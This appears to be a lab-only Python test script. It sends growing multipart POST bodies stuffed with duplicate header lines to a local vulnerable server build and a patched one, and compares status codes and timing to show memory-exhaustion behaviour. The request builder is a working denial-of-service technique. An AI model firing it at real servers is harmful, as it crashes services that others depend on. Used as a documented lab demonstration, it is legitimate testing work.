#!/usr/bin/env python3
"""Unsafe-probe LIMITS DEMO, part 1 — OOM impact is not an oracle (LAB ONLY).

What it does: posts duplicate-header multipart bodies at increasing wire
sizes to the obscure pair (:19093 vuln 8.5.11 vs :19094 patched 8.5.12) and
records ONLY worker behavior (HTTP status / reset / time). Small sizes: both
answer 200 — identical, no signal. OOM scale and boundary behavior are part 2
(tests/lab/unsafe_413_demo.py) with the full "why this must not ship" writeup.

What it NEVER does: no payload, no command, no heap spray, no session
injection, no second stage. Worker impact is expected and accepted: these are
throwaway lab containers. NEVER point this at anything you do not own and
cannot rebuild.

Usage (lab only):
    docker compose -f tests/lab/docker-compose.yml up -d obscure-backend obscure-front obscure-fixed-backend obscure-fixed-front
    python3 tests/lab/unsafe_probe_demo.py [--sizes-kb 351,703,1289]
"""
import socket
import sys
import time

MARK = b"X: a\r\n"  # 6-byte wire header -> ~314 B memory each on unpatched builds
TAIL = (b"------demo\r\n"
        b'Content-Disposition: form-data; name="t"\r\n\r\nv\r\n'
        b"------demo--\r\n")
TIMEOUT = 60


def fire(port: int, body: bytes) -> tuple[str, float]:
    head = (f"POST /api/submit HTTP/1.1\r\nHost: 127.0.0.1\r\n"
            f"Cookie: PHPSESSID=demoprobe\r\n"
            f"Content-Type: multipart/form-data; boundary=--demo\r\n"
            f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode()
    t0 = time.time()
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=TIMEOUT)
        s.settimeout(TIMEOUT)
        s.sendall(head + body)
        raw = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                raw += chunk
                if len(raw) > 4096:
                    break
        except Exception as e:
            s.close()
            return f"mid-read:{type(e).__name__}", round(time.time() - t0, 2)
        s.close()
        if not raw:
            return "empty", round(time.time() - t0, 2)
        return raw.split(b"\r\n", 1)[0].decode("latin-1", "replace"), round(time.time() - t0, 2)
    except Exception as e:
        return f"conn:{type(e).__name__}", round(time.time() - t0, 2)


def main() -> int:
    import argparse
    ap = argparse.ArgumentParser(description="Lab-only OOM size sweep (do not ship).")
    ap.add_argument("--sizes-kb", default="351,703,1289",
                    help="comma-separated wire sizes in KB")
    args = ap.parse_args()
    print("LAB-ONLY OOM size sweep: vuln=:19093 (8.5.11) vs patched=:19094 (8.5.12)")
    for kb in [int(x) for x in args.sizes_kb.split(",") if x.strip()]:
        n = max(1000, (kb * 1024) // len(MARK))
        body = MARK * n + TAIL
        row = [f"wire={len(body)//1024}KB"]
        for port, label in ((19093, "vuln"), (19094, "patched")):
            st, el = fire(port, body)
            code = st.split(" ", 2)[1] if " " in st else st
            row.append(f"{label}={code} ({el}s)")
            time.sleep(1)
        print("  " + "  ".join(row))
    print("Small sizes: identical 200s (no signal). Boundary behavior is part 2 "
          "(unsafe_413_demo.py) — read its docstring: divergence is observation, not oracle.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
